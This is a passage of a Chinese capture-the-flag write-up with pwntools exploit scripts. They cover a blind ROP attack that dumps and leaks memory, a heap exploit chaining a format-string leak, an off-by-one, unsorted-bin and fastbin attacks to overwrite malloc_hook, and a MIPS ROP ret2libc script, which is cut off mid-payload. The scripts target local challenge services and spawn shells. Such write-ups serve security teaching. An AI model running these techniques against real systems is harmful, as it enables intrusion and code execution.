                continue
            else:
                result = data
                offset += len(data)
                print "[*] offset is "+ hex(offset)
                print "[*] addr is "+ hex(addr)
            with open('code', 'ab') as f:
                f.write(result)
    def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
        sh = remote('127.0.0.1', 10001)
        payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
            puts_plt) + p64(stop_gadget)
        sh.recvuntil('Please tell me:')
        sh.sendline(payload)
        try:
            #sh.recvuntil(rdi_ret)
            #hello = 'a' * length + p8((rdi_ret>>1)&0xff) + p8((rdi_ret>>2)&0xff) + p8(rdi_ret & 0xff)
            hello = 'a' * length + '\x63\x09\x40'
            print "[*] hello is " + hello
            sh.recvuntil(hello)
            #sh.recv()
            data = sh.recv()
            sh.close()
            try:
                #print hex(rdi_ret)
                data = data[:data.index("\nHello")]
                #print data
            except Exception:
                data = data
            if data == "":
                data = '\x00'
            return data
        except Exception:
            sh.close()
            return None
    length = 216
    stop_gadget = 0x4007d6
    brop_gadget = 0x40095a
    rdi_ret = brop_gadget + 9
    puts_plt = 0x400635
    print "this is " + hex(rdi_ret)
    leakfunction(length, rdi_ret, puts_plt, stop_gadget)
    #io.interactive()
中间好像会中断一次,应该是申请了太多次,导致的断开连接了...
但是没事,继续泄露就行了,然后dump下来看汇编,找到对应的puts_plt哪行对应的地址...舒服了
一个重点:
这里会发现一个问题,我们的puts_plt = 0x400635
在前面都是正确的,因为代码的确会执行到puts的函数的功能,但是我们在实际查看dump下来的文件的时候,我们会发现这个
很巧的就是这个0x400635是在plt表的开头,然后puts正好是衔接着开头的,所以实际的plt的地址应该是后面那个,不信,可以改掉前面的635->640,是完全都可以运行的
**exp**
    #-*- coding:utf-8 –*-    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    length = 216
    stop_gadget = 0x4007d6
    brop_gadget = 0x40095a
    rdi_ret = brop_gadget + 9
    puts_plt = 0x400635
    puts_got = 0x601018
    sh = remote('127.0.0.1', 10001)
    sh.recvuntil('Please tell me:')
    payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
        stop_gadget)
    sh.sendline(payload)
    sh.recvuntil('\x63\x09\x40')
    data = sh.recvuntil('\nHello', drop=True)
    puts_addr = u64(data.ljust(8, '\x00'))
    print "[*] puts_addr is " + hex(puts_addr)
    libc = LibcSearcher('puts', puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    binsh_addr = libc_base + libc.dump('str_bin_sh')
    payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
        system_addr) + p64(stop_gadget)
    sh.sendline(payload)
    sh.interactive()
## PWN4
考点：  
fmt、offbyone、chunk overlapping、unsortedbin attack、fastbin attack
题解  
**漏洞点**
  1. banner 函数处有一处格式化字符串漏洞，可以用来泄露栈上的程序基地址和 libc 地址
  1. 在 get_input 函数处，存在一处 offbyone
  1. 在 add_note 函数中，只有当 key = 0x2B 时，可以 malloc 任意大小的 chunk，否则不能 malloc fastbin 大小的 chunk：
  1. 所以这里利用 offbyone 配合 unsorted bin attack，使得 key 为 0x2B（malloc+88 的低 12 bit 的字节是 B），再使用一次 chunk overlapping，即可进行 fastbin attack，之后覆盖 fd 为 malloc 上方，覆盖 malloc_hook 即可。
**EXP**
    from pwn import *
    #context.log_level="debug"
    DEBUG=1
    EXEC_FILE = "./pwn1"
    REMOTE_LIBC = "/home/h4lo/ctf/glibc/glibc_2_23/glibc-2.23/_debug/lib/libc-2.23.so"
    def main():
        if DEBUG:
            r = process(EXEC_FILE)
            elf = ELF(EXEC_FILE)
            libc = elf.libc
            one_gadget = 0xce51c
        else:
            r = remote("")
            elf = ELF(EXEC_FILE)
            libc = ELF(REMOTE_LIBC)
        one_gadget = 0xce51c
        def menu(idx):
            sleep(0.1)
            r.recv()
            sleep(0.1)
            r.sendline(str(idx))
        def add(idx,size,content):
            menu(1)
            r.recv()
            r.sendline(str(idx))
            r.recv()
            r.sendline(str(size))
            r.recv()
            r.sendline(str(content))
        def delete(idx):
            menu(2)
            r.recv()
            r.sendline(str(idx))
        '''
        def show(idx):
            menu()
                r.recv()
                r.sendline(str(idx))
        '''
        def edit(idx,content):
            menu(4)
            r.recv()
            r.sendline(str(idx))
            r.recv()
            r.sendline(str(content))
        r.recv()
        r.sendline("%15$lx%11$lx")
        r.recvuntil("Hello, ")
        libc_addr = eval("0x"+r.recv(2*6)) - 267 - libc.symbols['__libc_start_main']
        success(hex(libc_addr))
        base_addr = eval("0x"+r.recv(2*6)) - 28 - 0x116a
        success(hex(base_addr))
        add(0,0x88,'a')
        add(1,0x88,'a')
        add(2,0x88,'a')
        add(3,0x88,'a')
        add(4,0x88,'a')
        add(5,0x88,'a')
        delete(0)
        edit(3,'a'*0x80+p64(0x240)+p8(0x90))
        delete(4)
        add(0,0x88,'a')
        add(4,0x88,'a')
        add(6,0x88,'a')
        edit(0,'a'*0x88+p8(0x71))
        edit(1,'a'*0x60+p64(0)+p64(0x21)+'a'*0x18+p64(0x71))
        edit(2,'a'*0x60+p64(0)+p8(0x21))
        #add(7,0x88,'a')
        #edit(1,p64(0)+p64(base_addr+0x20202f))
        edit(3,p64(0)+p64(base_addr+0x20202f))
        #add(5,0xf8,'a')
        #add(6,0x1f0,"a")
        delete(1)
        delete(2)
        add(1,0x110,'a')
        edit(6,p64(libc_addr + libc.symbols['main_arena'] - 0x30 - 3))
        #pause()
        r.sendlineafter(">> ",'1')
        r.sendlineafter(":",'2')
        #add(2,0x68,'a')
        r.sendlineafter(":\n",str(0x68))
        if "hack" in r.recvline():
            return
        r.sendline("H4lo")
        payload = 'a'*0x13 + p64(libc_addr + one_gadget)    # one_gadget
        add(8,0x68,payload)
        add(9,0x68,"H4lo")
        r.interactive()
    if __name__ == '__main__':
        while(True):
            main()
## PWN5
考点：  
一道 Mips 指令的 rop 的题目，需要对 mips 指令有一定的熟悉
题解
  1. 逆向代码，在 vuln 函数中存在一处栈溢出
  1. 但是没有 system 函数，需要进行 ret2libc 的利用，先泄露出 got 表里面的内容，之后调用 system 函数即可。
  1. /bin/sh 字符串在 libc 中也可以找到，直接调用 system("/bin/sh") 即可。
**EXP**
    from pwn import *
    #context.log_level="debug"
    r = remote("127.0.0.1",8881)
    #r = process("./build_pwn2.sh")
    elf = ELF("./pwn2")
    libc = ELF("/home/h4lo/mipsel-env/lib/libuClibc-0.9.33.2.so")
    payload = "H4lo"
    #payload += p32(0x00410AA0)
    r.recvuntil("What's your name:")
    r.sendline(payload)
    sleep(0.2)
    r.recv()
    sleep(0.2)
    # gadget1
    payload = p32(1) * 9
    payload += p32(0x004006C8)
    #payload += p32(elf.plt['puts'])    # fp
    payload += p32(1)
    payload += "a" * 0x18
    payload += 'a' * 4 # s0
    #payload += p32(elf.got['puts']) # s1
    payload += p32(0x00410B58)
    payload += p32(0x0040092C) # s2
    payload += 'a' * 4 # s3
    payload += p32(0x004007A4) # ra
    payload += 'a'*0x20
    payload += p32(0x004007C4)
    sleep(0.2)
    r.send(payload)
    r.recv()
    #success(a)
    libc_addr = u32(r.recv(4))-libc.symbols['puts']
    success("libc_addr: " + hex(libc_addr))
    r.recv()
    #r.send(payload)
    system_addr = libc_addr + libc.symbols['system']
    binsh_addr = libc_addr + 0x9bc48
    # gadget2
    payload = 'a'*0x24